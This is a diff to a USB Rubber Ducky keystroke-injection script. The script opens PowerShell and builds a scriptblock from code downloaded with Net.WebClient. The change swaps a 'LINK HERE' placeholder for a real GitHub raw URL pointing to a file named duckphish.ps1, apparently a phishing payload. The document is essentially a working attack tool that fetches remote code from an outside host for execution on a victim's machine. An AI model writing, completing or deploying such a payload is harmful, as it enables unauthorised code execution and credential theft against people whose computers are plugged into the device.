@@ -6,7 +6,7 @@ STRING powershell -w maximized
 ENTER
 DELAY 200
 REM now we read in the script as a scriptblock
-STRING $script = [scriptblock]::Create((New-Object Net.WebClient).DownloadString('LINK HERE'));
+STRING $script = [scriptblock]::Create((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/makozort/ducky-phish/main/duckphish.ps1'));
 DELAY 500
 ENTER
 DELAY 2000
